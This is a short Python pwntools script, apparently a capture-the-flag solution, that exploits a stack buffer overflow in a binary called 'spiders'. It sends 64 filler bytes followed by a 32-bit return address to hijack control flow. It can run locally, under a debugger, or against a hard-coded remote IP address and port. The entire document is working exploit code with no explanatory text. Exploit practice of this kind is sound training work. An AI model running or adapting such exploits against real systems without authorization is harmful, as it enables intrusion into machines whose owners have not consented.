from pwn import *

binary = './spiders'
elf = context.binary = ELF(binary, checksec=True)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if 'remote' in sys.argv:
    p = remote('34.124.192.13', 27302)
else:
    p = process(binary)
    if 'gdb' in sys.argv:
        gdb.attach(p, gdbscript=gdbscript)

payload = b'a'*64
payload+= p32(0x080491a6)

p.sendline(payload)

print(p.recvall())
